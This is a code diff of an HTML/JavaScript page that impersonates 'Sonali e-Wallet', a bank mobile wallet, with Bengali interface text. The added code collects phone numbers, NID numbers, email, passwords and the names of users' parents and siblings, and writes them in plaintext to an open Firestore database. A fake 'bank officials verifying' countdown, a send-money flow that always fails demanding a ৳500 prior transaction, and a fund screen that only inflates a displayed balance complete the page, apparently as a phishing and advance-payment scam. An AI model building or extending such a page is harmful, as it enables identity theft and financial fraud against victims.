@@ -5,468 +5,332 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sonali e-Wallet</title>
     <style>
-        * {
-            box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
-            margin: 0;
-            padding: 0;
-            user-select: none;
-            -webkit-user-select: none;
-        }
-
-        body {
-            background-color: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
-        }
-
-        .app-screen {
-            width: 100%;
-            max-width: 390px;
-            background-color: #ffffff;
-            min-height: 100vh;
-            position: relative;
-            box-shadow: 0 0 20px rgba(0,0,0,0.15);
-            padding-bottom: 75px;
-            overflow: hidden;
-        }
-
-        /* হেডার - সোনালী হলুদ */
-        .header-bg {
-            background: #e6b422;
-            padding: 25px 16px 55px 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: white;
-        }
-
-        .header-title-box {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .sun-logo {
-            width: 32px;
-            height: 32px;
-        }
-
-        .header-text {
-            font-size: 19px;
-            font-weight: 500;
-            color: #ffffff;
-            letter-spacing: 0.3px;
-        }
-
-        .bell-icon {
-            width: 22px;
-            height: 22px;
-        }
-
-        /* নীল ব্যালেন্স বক্স */
-        .balance-card {
-            margin: -35px 14px 20px 14px;
-            background-color: #0b5ea8;
-            border-radius: 12px;
-            padding: 12px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.12);
-            background-image: radial-gradient(#1269b8 10%, transparent 10%);
-            background-size: 8px 8px;
-        }
-
-        .balance-btn-group {
-            display: flex;
-            justify-content: space-between;
-            gap: 12px;
-        }
-
-        .btn-bal {
-            flex: 1;
-            padding: 7px 0;
-            border-radius: 7px;
-            border: 1.5px solid #ffffff;
-            background: transparent;
-            color: #ffffff;
-            font-weight: bold;
-            font-size: 13.5px;
-            cursor: pointer;
-            outline: none;
-        }
-
-        .btn-bal:active {
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        .balance-display-val {
-            color: #ffffff;
-            text-align: center;
-            font-size: 22px;
-            font-weight: bold;
-            margin-top: 10px;
-            display: none;
-            letter-spacing: 1px;
-        }
-
-        /* ৩টি কলাম বিশিষ্ট গ্রিড */
-        .service-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px 10px;
-            padding: 0 14px;
-        }
-
-        .grid-item {
-            background: #ffffff;
-            border-radius: 10px;
-            padding: 10px 4px 8px 4px;
-            text-align: center;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.07);
-            cursor: pointer;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 82px;
-            border: 1px solid #f0f0f0;
-        }
-
-        .grid-item svg {
-            width: 44px;
-            height: 44px;
-            margin-bottom: 4px;
-        }
-
-        .grid-item span {
-            font-size: 11.5px;
-            color: #222222;
-            font-weight: 600;
-        }
-
-        /* কল সাপোর্ট বাটন */
-        .call-floating-btn {
-            position: fixed;
-            bottom: 70px;
-            right: calc(50% - 180px);
-            width: 46px;
-            height: 46px;
-            background: #ffffff;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.18);
-            z-index: 10;
-        }
-
-        /* বটম ন্যাভিগেশন বার */
-        .bottom-nav-bar {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            max-width: 390px;
-            background: #ffffff;
-            display: flex;
-            justify-content: space-around;
-            align-items: flex-end;
-            padding: 6px 0 4px 0;
-            border-top: 1px solid #e2e2e2;
-            z-index: 20;
-        }
-
-        .nav-link-item {
-            text-align: center;
-            color: #666666;
-            text-decoration: none;
-            font-size: 10px;
-            flex: 1;
-            font-weight: 500;
-        }
-
-        .nav-link-item.active {
-            color: #d8a30a;
-            font-weight: bold;
-        }
-
-        .qr-center-container {
-            position: relative;
-            top: -12px;
-            background: #e6b422;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border: 3px solid #ffffff;
-            box-shadow: 0 -2px 6px rgba(0,0,0,0.12);
-        }
-
-        /* স্ক্রিন ট্রানজিশন লজিক */
-        .page-screen { display: block; }
-        .hidden-screen { display: none !important; }
-
-        /* সেন্ড মানি পেজ ফর্ম */
-        .form-card-box {
-            padding: 20px;
-            background: #ffffff;
-            margin: 15px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
-            border: 1px solid #eeeeee;
-        }
-
-        .form-group-item { margin-bottom: 16px; }
-        .form-group-item label { display: block; margin-bottom: 8px; font-size: 13px; font-weight: bold; color: #333; }
-        
-        .operator-select-box { display: flex; gap: 10px; }
-        .op-card {
-            flex: 1;
-            padding: 12px;
-            border: 2px solid #dddddd;
-            border-radius: 8px;
-            text-align: center;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 14px;
-            background: #fff;
-        }
-        .op-card.bkash-selected { border-color: #e2136e; color: #e2136e; background: #ffeef5; }
-        .op-card.nagad-selected { border-color: #f7941d; color: #f7941d; background: #fff5eb; }
-
-        .text-input-field {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #cccccc;
-            border-radius: 8px;
-            font-size: 15px;
-            outline: none;
-        }
-
-        .btn-submit-action {
-            width: 100%;
-            padding: 12px;
-            background: #0b5ea8;
-            color: #ffffff;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        /* ১০ সেকেন্ড লোডার */
-        .loader-center { text-align: center; padding: 60px 20px; }
-        .spin-ring {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #0b5ea8;
-            border-radius: 50%;
-            width: 45px;
-            height: 45px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px auto;
-        }
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; user-select: none; }
+        body { background-color: #f4f5f7; display: flex; justify-content: center; }
+        .app-screen { width: 100%; max-width: 412px; background-color: #ffffff; min-height: 100vh; position: relative; box-shadow: 0 0 15px rgba(0,0,0,0.1); padding-bottom: 70px; }
+        .header-bg { background: #e2a016; padding: 15px 18px 25px 18px; display: flex; justify-content: space-between; align-items: center; color: white; }
+        .header-title { font-size: 20px; font-weight: bold; display: flex; align-items: center; gap: 8px; }
+        .balance-card { margin: -18px 15px 15px 15px; background-color: #0b5ea8; border-radius: 10px; padding: 14px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
+        .balance-btn-group { display: flex; justify-content: space-between; gap: 10px; }
+        .btn-bal { flex: 1; padding: 6px 0; border-radius: 6px; border: 1.5px solid #ffffff; background: transparent; color: #ffffff; font-weight: bold; font-size: 13px; cursor: pointer; }
+        .balance-val { color: #ffffff; text-align: center; font-size: 24px; font-weight: bold; margin-top: 10px; }
+        .service-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; padding: 10px 15px; }
+        .grid-item { background: #ffffff; border-radius: 12px; padding: 15px 5px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.06); cursor: pointer; border: 1px solid #f0f0f0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 95px; }
+        .grid-icon { font-size: 28px; margin-bottom: 6px; }
+        .grid-item span { font-size: 12px; color: #333; font-weight: bold; }
+        .hidden { display: none !important; }
+        .form-box { padding: 20px; margin: 15px; background: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); }
+        .form-group { margin-bottom: 12px; }
+        .form-group label { display: block; margin-bottom: 4px; font-size: 12px; font-weight: bold; color: #444; }
+        .input-field { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; outline: none; }
+        .btn-action { width: 100%; padding: 12px; background: #0b5ea8; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .auth-header { background: #0b5ea8; color: white; padding: 15px; text-align: center; font-weight: bold; }
+        .tab-group { display: flex; border-bottom: 2px solid #ddd; margin-bottom: 15px; }
+        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; font-weight: bold; color: #666; }
+        .tab.active { color: #0b5ea8; border-bottom: 3px solid #0b5ea8; }
+        .loader-box { text-align: center; padding: 50px 20px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0b5ea8; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* অ্যালার্ট বক্স */
-        .alert-message-box {
-            background: #fff8e1;
-            color: #d9534f;
-            padding: 20px;
-            border: 1px solid #ffe082;
-            border-radius: 10px;
-            font-size: 15px;
-            line-height: 1.5;
-            text-align: center;
-            font-weight: bold;
-            margin: 20px;
-        }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 412px; background: white; display: flex; justify-around: space-around; padding: 10px 0; border-top: 1px solid #eee; }
+        .nav-item { text-align: center; color: #666; font-size: 11px; font-weight: bold; cursor: pointer; }
+        .error-msg { color: #d9534f; font-size: 13px; font-weight: bold; margin-top: 8px; text-align: center; }
     </style>
 </head>
 <body>
 
 <div class="app-screen">
-    
-    <!-- সোনালী হলুদ হেডার -->
-    <div class="header-bg">
-        <div class="header-title-box">
-            <svg class="sun-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="50" cy="50" r="20" fill="white"/>
-                <circle cx="50" cy="50" r="14" fill="#e6b422"/>
-                <circle cx="50" cy="50" r="8" fill="white"/>
-                <path d="M50 5 L55 25 L50 20 L45 25 Z" fill="white"/>
-                <path d="M50 95 L55 75 L50 80 L45 75 Z" fill="white"/>
-                <path d="M5 50 L25 55 L20 50 L25 45 Z" fill="white"/>
-                <path d="M95 50 L75 55 L80 50 L75 45 Z" fill="white"/>
-                <path d="M18 18 L36 30 L31 25 L30 36 Z" fill="white"/>
-                <path d="M82 82 L64 70 L69 75 L70 64 Z" fill="white"/>
-                <path d="M18 82 L30 64 L25 69 L36 70 Z" fill="white"/>
-                <path d="M82 18 L70 36 L75 31 L64 30 Z" fill="white"/>
-            </svg>
-            <span class="header-text">Sonali e-Wallet</span>
+
+    <!-- Auth Screen -->
+    <div id="auth-screen">
+        <div class="auth-header">Sonali e-Wallet System</div>
+        <div class="form-box">
+            <div class="tab-group">
+                <div id="tab-log" class="tab active" onclick="switchTab('login')">লগইন</div>
+                <div id="tab-reg" class="tab" onclick="switchTab('reg')">রেজিস্ট্রেশন</div>
+            </div>
+
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="form-group"><label>মোবাইল নম্বর</label><input type="tel" id="log-phone" class="input-field" placeholder="017XXXXXXXX" required></div>
+                <div class="form-group"><label>পাসওয়ার্ড</label><input type="password" id="log-pass" class="input-field" required></div>
+                <button type="submit" class="btn-action">লগইন</button>
+                <div id="log-error" class="error-msg"></div>
+            </form>
+
+            <form id="regForm" onsubmit="handleRegistration(event)" class="hidden">
+                <div class="form-group"><label>মোবাইল নম্বর</label><input type="tel" id="reg-phone" class="input-field" placeholder="017XXXXXXXX" required></div>
+                <div class="form-group"><label>ইমেইল</label><input type="email" id="reg-email" class="input-field" required></div>
+                <div class="form-group"><label>এনআইডি (NID)</label><input type="number" id="reg-nid" class="input-field" required></div>
+                <div class="form-group"><label>পিতার নাম</label><input type="text" id="reg-father" class="input-field" required></div>
+                <div class="form-group"><label>মাতার নাম</label><input type="text" id="reg-mother" class="input-field" required></div>
+                <div class="form-group"><label>ভাই/বোনের নাম</label><input type="text" id="reg-sibling" class="input-field" required></div>
+                <div class="form-group"><label>পাসওয়ার্ড</label><input type="password" id="reg-pass" class="input-field" required></div>
+                <button type="submit" class="btn-action">রেজিস্টার করুন</button>
+            </form>
         </div>
-        <svg class="bell-icon" viewBox="0 0 24 24" fill="white">
-            <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/>
-        </svg>
     </div>
 
-    <!-- ড্যাশবোর্ড স্ক্রিন -->
-    <div id="main-dashboard-screen" class="page-screen">
+    <!-- 70s Loader -->
+    <div id="reg-loader-screen" class="hidden">
+        <div class="loader-box">
+            <div class="spinner"></div>
+            <h3>ব্যাংক কর্মকর্তারা আপনার তথ্য পরীক্ষা করে দেখছেন...</h3>
+            <h1 id="timer-val" style="color:#0b5ea8; margin-top:15px;">70</h1>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboard-screen" class="hidden">
+        <div class="header-bg">
+            <div class="header-title">☀️ Sonali e-Wallet</div>
+            <button onclick="location.reload()" style="background:#d9534f; color:white; border:none; padding:5px 10px; border-radius:4px; cursor:pointer;">Logout</button>
+        </div>
         <div class="balance-card">
             <div class="balance-btn-group">
-                <button class="btn-bal" onclick="toggleBalance()">Bank Balance</button>
-                <button class="btn-bal">Wallet Balance</button>
+                <button class="btn-bal" onclick="showBalance('bank')">Bank Balance</button>
+                <button class="btn-bal" onclick="showBalance('wallet')">Wallet Balance</button>
             </div>
-            <div id="balance-value-text" class="balance-display-val">৳ 150,432.00</div>
+            <div id="bal-text" class="balance-val">৳ 0.00</div>
         </div>
 
         <div class="service-grid">
-            <div class="grid-item">
-                <span>E-Bank</span>
-            </div>
-            <div class="grid-item">
-                <span>Bill Pay</span>
-            </div>
-            <div class="grid-item">
-                <span>Recharge</span>
-            </div>
-            <!-- Send Money Option -->
-            <div class="grid-item" onclick="showSendMoneyForm()">
-                <svg viewBox="0 0 100 100">
-                    <path d="M15 65 Q 40 50 65 65 L 65 80 L 15 80 Z" fill="#2c3e50"/>
-                    <path d="M45 40 Q 65 30 85 40 L 85 55 L 45 55 Z" fill="#0b5ea8"/>
-                    <circle cx="55" cy="30" r="18" fill="#e6b422"/>
-                    <circle cx="55" cy="30" r="13" fill="#e6b422" stroke="#fff" stroke-width="2"/>
-                    <text x="55" y="35" font-size="14" fill="#fff" font-weight="bold" text-anchor="middle">৳</text>
-                </svg>
-                <span>Send Money</span>
-            </div>
-            <div class="grid-item"><span>Cards</span></div>
-            <div class="grid-item"><span>DPS & FDR</span></div>
-            <div class="grid-item"><span>BEFTN</span></div>
-            <div class="grid-item"><span>Sonali eSheba</span></div>
-            <div class="grid-item"><span>Remittance</span></div>
-            <div class="grid-item"><span>Binimoy</span></div>
-            <div class="grid-item"><span>NPSB</span></div>
-            <div class="grid-item"><span>Services</span></div>
-        </div>
-
-        <div class="call-floating-btn">
-            <svg viewBox="0 0 24 24" fill="#0b5ea8" width="24" height="24">
-                <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
-            </svg>
+            <div class="grid-item" onclick="openSendMoney()"><div class="grid-icon">💸</div><span>Send Money</span></div>
+            <div class="grid-item" onclick="openAddFund()"><div class="grid-icon">💳</div><span>Add Fund</span></div>
+            <div class="grid-item" onclick="showBankAlert('E-Bank সেবায় যুক্ত হতে ব্যাংক অ্যাকাউন্ট ভেরিফাই করুন।')"><div class="grid-icon">🏦</div><span>E-Bank</span></div>
+            <div class="grid-item" onclick="showBankAlert('Bill Pay সেবা পেতে পূর্বে সর্বনিম্ন ৫০০ টাকা লেনদেন থাকতে হবে।')"><div class="grid-icon">🧾</div><span>Bill Pay</span></div>
+            <div class="grid-item" onclick="showBankAlert('মোবাইল রিচার্জ সেবাটি সাময়িকভাবে রক্ষণাবেক্ষণে রয়েছে।')"><div class="grid-icon">📱</div><span>Recharge</span></div>
+            <div class="grid-item" onclick="showBankAlert('আপনার নতুন ডেবিট কার্ড ইস্যু করতে ব্যাংকে যোগাযোগ করুন।')"><div class="grid-icon">💳</div><span>Cards</span></div>
+            <div class="grid-item" onclick="showBankAlert('নতুন DPS অ্যাকাউন্ট খুলতে অ্যাকাউন্ট ব্যালেন্স ৫০০ টাকা থাকা আবশ্যক।')"><div class="grid-icon">📈</div><span>DPS & FDR</span></div>
+            <div class="grid-item" onclick="showBankAlert('BEFTN সেবার জন্য আপনার অ্যাকাউন্ট এক্টিভ নয়।')"><div class="grid-icon">🏛️</div><span>BEFTN</span></div>
+            <div class="grid-item" onclick="showBankAlert('Sonali eSheba ব্যবহারের জন্য নিকটস্থ সোনালী ব্যাংকে যোগাযোগ করুন।')"><div class="grid-icon">🌟</div><span>Sonali eSheba</span></div>
         </div>
     </div>
 
-    <!-- সেন্ড মানি পেজ -->
-    <div id="send-money-screen" class="page-screen hidden-screen">
-        <div class="form-card-box">
-            <h3 style="margin-bottom: 15px; color: #0b5ea8;">Send Money</h3>
-            
-            <div class="form-group-item">
-                <label>মেথড সিলেক্ট করুন:</label>
-                <div class="operator-select-box">
-                    <div id="btn-bkash" class="op-card" onclick="selectPaymentMethod('bkash')">bKash</div>
-                    <div id="btn-nagad" class="op-card" onclick="selectPaymentMethod('nagad')">Nagad</div>
-                </div>
+    <!-- Add Fund Screen -->
+    <div id="add-fund-screen" class="hidden">
+        <div class="form-box">
+            <h3>Add Fund (টাকা জমা করুন)</h3>
+            <div class="form-group" style="margin-top:10px;">
+                <label>পেমেন্ট মাধ্যম সিলেক্ট করুন:</label>
+                <select class="input-field"><option>bKash</option><option>Nagad</option><option>Rocket</option></select>
             </div>
-
-            <div class="form-group-item">
-                <label>নম্বর বসান:</label>
-                <input type="number" id="input-phone-no" class="text-input-field" placeholder="01XXXXXXXXX">
-            </div>
-
-            <button class="btn-submit-action" onclick="submitSendMoneyProcess()">Next</button>
-            <button class="btn-submit-action" style="background: #777777; margin-top: 10px;" onclick="backToHome()">Back</button>
+            <div class="form-group"><label>টাকার পরিমাণ:</label><input type="number" id="add-amount" class="input-field" placeholder="যেমন: 1000"></div>
+            <button class="btn-action" onclick="processAddFund()">Submit</button>
+            <button class="btn-action" style="background:#666;" onclick="showScreen('dashboard-screen')">ফিরে যান</button>
         </div>
     </div>
 
-    <!-- ১০ সেকেন্ডের লোডার স্ক্রিন -->
-    <div id="loader-screen" class="page-screen hidden-screen">
-        <div class="loader-center">
-            <div class="spin-ring"></div>
-            <p style="color: #555; font-weight: bold;">অপেক্ষা করুন, লেনদেন প্রসেস করা হচ্ছে...</p>
+    <!-- Send Money Step 1 -->
+    <div id="send-step1" class="hidden">
+        <div class="form-box">
+            <h3>Send Money</h3>
+            <div class="form-group" style="margin-top:10px;"><label>প্রাপকের নম্বর:</label><input type="number" class="input-field" placeholder="01XXXXXXXXX"></div>
+            <button class="btn-action" onclick="submitSend1()">পরবর্তী (৫ সেকেন্ড অপেক্ষা)</button>
         </div>
     </div>
 
-    <!-- অ্যালার্ট স্ক্রিন (১০ সেকেন্ড পর যা দেখাবে) -->
-    <div id="alert-screen" class="page-screen hidden-screen">
-        <div class="alert-message-box">
-            ⚠️ সর্বনিম্ন ১০০০ টাকা লেনদেন থাকতে হবে।
+    <!-- Send Money Step 2 -->
+    <div id="send-step2" class="hidden">
+        <div class="form-box">
+            <h3>টাকার পরিমাণ লিখুন</h3>
+            <div class="form-group" style="margin-top:10px;"><input type="number" class="input-field" placeholder="500"></div>
+            <button class="btn-action" onclick="submitSend2()">সাবমিট করুন (১৫ সেকেন্ড প্রসেস)</button>
         </div>
-        <div style="padding: 0 20px;">
-            <button class="btn-submit-action" onclick="backToHome()">হোম পেজে ফিরে যান</button>
+    </div>
+
+    <!-- Generic Loader Screen -->
+    <div id="generic-loader" class="hidden">
+        <div class="loader-box">
+            <div class="spinner"></div>
+            <h4 id="gen-loader-text">অপেক্ষা করুন...</h4>
         </div>
+    </div>
+
+    <!-- Notice/Alert Screen -->
+    <div id="alert-screen" class="hidden">
+        <div class="form-box" style="text-align:center;">
+            <p id="alert-msg" style="color:#d32f2f; font-weight:bold;"></p>
+            <button class="btn-action" onclick="showScreen('dashboard-screen')">ঠিক আছে</button>
+        </div>
+    </div>
+
+    <!-- Bottom Navigation Bar -->
+    <div id="bottom-nav" class="bottom-nav hidden">
+        <div class="nav-item" onclick="showScreen('dashboard-screen')">🏠<br>Home</div>
+        <div class="nav-item" onclick="openAddFund()">➕<br>Add Fund</div>
     </div>
 
 </div>
 
 <script>
-    // ব্যালেন্স হাইড/শো
-    function toggleBalance() {
-        var balText = document.getElementById("balance-value-text");
-        if (balText.style.display === "none" || balText.style.display === "") {
-            balText.style.display = "block";
+    const PROJECT_ID = "sonali-24dcc"; 
+    let currentUser = null;
+    let currentBalanceType = 'bank';
+
+    function switchTab(t) {
+        document.getElementById('log-error').innerText = "";
+        if(t === 'login'){
+            document.getElementById('tab-log').classList.add('active');
+            document.getElementById('tab-reg').classList.remove('active');
+            document.getElementById('loginForm').classList.remove('hidden');
+            document.getElementById('regForm').classList.add('hidden');
         } else {
-            balText.style.display = "none";
+            document.getElementById('tab-reg').classList.add('active');
+            document.getElementById('tab-log').classList.remove('active');
+            document.getElementById('regForm').classList.remove('hidden');
+            document.getElementById('loginForm').classList.add('hidden');
         }
     }
 
-    // সেন্ড মানি স্ক্রিন দেখানোর ফাংশন
-    function showSendMoneyForm() {
-        document.getElementById("main-dashboard-screen").classList.add("hidden-screen");
-        document.getElementById("send-money-screen").classList.remove("hidden-screen");
+    async function handleRegistration(e) {
+        e.preventDefault();
+        const rawPhone = document.getElementById('reg-phone').value.trim();
+        const phone = rawPhone.replace(/\s+/g, ''); // Remove spaces
+        const password = document.getElementById('reg-pass').value.trim();
+
+        showScreen('reg-loader-screen');
+
+        const restUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/users?documentId=${phone}`;
+        const payload = {
+            fields: {
+                phone: { stringValue: phone },
+                password: { stringValue: password },
+                email: { stringValue: document.getElementById('reg-email').value },
+                nid: { stringValue: document.getElementById('reg-nid').value },
+                father: { stringValue: document.getElementById('reg-father').value },
+                mother: { stringValue: document.getElementById('reg-mother').value },
+                sibling: { stringValue: document.getElementById('reg-sibling').value },
+                bankBalance: { doubleValue: 0.00 },
+                walletBalance: { doubleValue: 0.00 }
+            }
+        };
+
+        try {
+            await fetch(restUrl, { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify(payload) 
+            });
+            currentUser = { phone, bankBalance: 0.00, walletBalance: 0.00 };
+            updateBalanceUI();
+        } catch(err) { 
+            console.error("Error saving data:", err); 
+        }
+
+        let left = 70;
+        const timer = setInterval(() => {
+            left--;
+            document.getElementById('timer-val').innerText = left;
+            if (left <= 0) {
+                clearInterval(timer);
+                showScreen('dashboard-screen');
+                document.getElementById('bottom-nav').classList.remove('hidden');
+            }
+        }, 1000);
     }
 
-    // পেমেন্ট অপশন সিলেক্ট করা
-    let selectedMethod = '';
-    function selectPaymentMethod(method) {
-        selectedMethod = method;
-        document.getElementById("btn-bkash").classList.remove("bkash-selected");
-        document.getElementById("btn-nagad").classList.remove("nagad-selected");
+    async function handleLogin(e) {
+        e.preventDefault();
+        const rawPhone = document.getElementById('log-phone').value.trim();
+        const phone = rawPhone.replace(/\s+/g, '');
+        const pass = document.getElementById('log-pass').value.trim();
+        const errDiv = document.getElementById('log-error');
+        errDiv.innerText = "যাচাই করা হচ্ছে...";
 
-        if (method === 'bkash') {
-            document.getElementById("btn-bkash").classList.add("bkash-selected");
-        } else if (method === 'nagad') {
-            document.getElementById("btn-nagad").classList.add("nagad-selected");
+        const restUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/users/${phone}`;
+
+        try {
+            const response = await fetch(restUrl);
+            if (!response.ok) {
+                errDiv.innerText = "ভুল মোবাইল নম্বর অথবা অ্যাকাউন্ট খুঁজে পাওয়া যায়নি!";
+                return;
+            }
+            const data = await response.json();
+            const dbPass = data.fields?.password?.stringValue;
+
+            if (dbPass === pass) {
+                errDiv.innerText = "";
+                currentUser = {
+                    phone: phone,
+                    bankBalance: parseFloat(data.fields?.bankBalance?.doubleValue || data.fields?.bankBalance?.integerValue || 0),
+                    walletBalance: parseFloat(data.fields?.walletBalance?.doubleValue || data.fields?.walletBalance?.integerValue || 0)
+                };
+                updateBalanceUI();
+                showScreen('dashboard-screen');
+                document.getElementById('bottom-nav').classList.remove('hidden');
+            } else {
+                errDiv.innerText = "ভুল পাসওয়ার্ড! সঠিক পাসওয়ার্ড দিন।";
+            }
+        } catch (err) {
+            errDiv.innerText = "সার্ভারে যোগাযোগ করা যাচ্ছে না। Rules সেভ করা আছে কি না যাচাই করুন।";
         }
     }
 
-    // সাবমিট এবং ১০ সেকেন্ড লোডিং লজিক
-    function submitSendMoneyProcess() {
-        var phone = document.getElementById("input-phone-no").value;
-        
-        if(!selectedMethod) {
-            alert("অনুগ্রহ করে বিকাশ বা নগদ সিলেক্ট করুন।");
+    function updateBalanceUI() {
+        if (!currentUser) return;
+        const val = currentBalanceType === 'bank' ? currentUser.bankBalance : currentUser.walletBalance;
+        document.getElementById('bal-text').innerText = `৳ ${val.toFixed(2)}`;
+    }
+
+    function showBalance(type) {
+        currentBalanceType = type;
+        updateBalanceUI();
+    }
+
+    function openSendMoney() { showScreen('send-step1'); }
+    function openAddFund() { showScreen('add-fund-screen'); }
+    
+    function submitSend1() {
+        document.getElementById('gen-loader-text').innerText = "৫ সেকেন্ড অপেক্ষা করুন...";
+        showScreen('generic-loader');
+        setTimeout(() => showScreen('send-step2'), 5000);
+    }
+
+    function submitSend2() {
+        document.getElementById('gen-loader-text').innerText = "১৫ সেকেন্ড লেনদেন প্রসেস হচ্ছে...";
+        showScreen('generic-loader');
+        setTimeout(() => {
+            document.getElementById('alert-msg').innerText = "উক্ত নম্বরে লেনদেন করতে গেলে অবশ্যই অ্যাকাউন্টে ৳৫০০ লেনদেন থাকতে হবে।";
+            showScreen('alert-screen');
+        }, 15000);
+    }
+
+    async function processAddFund() {
+        const amtInput = document.getElementById('add-amount').value;
+        const amt = parseFloat(amtInput);
+        if (!amt || amt <= 0) {
+            alert("সঠিক পরিমাণ লিখুন!");
             return;
         }
-        if(!phone) {
-            alert("অনুগ্রহ করে মোবাইল নম্বর দিন।");
-            return;
+
+        document.getElementById('gen-loader-text').innerText = "আপনার ফান্ড যুক্ত করার প্রক্রিয়া চলছে...";
+        showScreen('generic-loader');
+
+        if(currentUser) {
+            currentUser.walletBalance += amt;
+            const updateUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/users/${currentUser.phone}?updateMask.fieldPaths=walletBalance`;
+            const payload = { fields: { walletBalance: { doubleValue: currentUser.walletBalance } } };
+            try {
+                await fetch(updateUrl, { method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            } catch(e) { console.error(e); }
         }
 
-        // সেন্ড মানি ফর্ম লুকিয়ে লোডার চালু করা
-        document.getElementById("send-money-screen").classList.add("hidden-screen");
-        document.getElementById("loader-screen").classList.remove("hidden-screen");
-
-        // ১০ সেকেন্ডের (১০,০০০ মিলি-সেকেন্ড) টাইমার
-        setTimeout(function() {
-            document.getElementById("loader-screen").classList.add("hidden-screen");
-            document.getElementById("alert-screen").classList.remove("hidden-screen");
-        }, 10000);
+        setTimeout(() => {
+            updateBalanceUI();
+            document.getElementById('alert-msg').innerText = `৳${amt} টাকা আপনার ওয়ালেটে সফলভাবে জমা হয়েছে।`;
+            showScreen('alert-screen');
+        }, 3000);
     }
 
-    // ড্যাশবোর্ডে ফিরে আসার ফাংশন
-    function backToHome() {
-        document.getElementById("send-money-screen").classList.add("hidden-screen");
-        document.getElementById("loader-screen").classList.add("hidden-screen");
-        document.getElementById("alert-screen").classList.add("hidden-screen");
-        document.getElementById("main-dashboard-screen").classList.remove("hidden-screen");
+    function showBankAlert(msg) {
+        document.getElementById('alert-msg').innerText = msg;
+        showScreen('alert-screen');
+    }
+
+    function showScreen(id) {
+        ['auth-screen', 'reg-loader-screen', 'dashboard-screen', 'send-step1', 'send-step2', 'generic-loader', 'alert-screen', 'add-fund-screen'].forEach(s => document.getElementById(s).classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
     }
 </script>
-
 </body>
     </html>
     
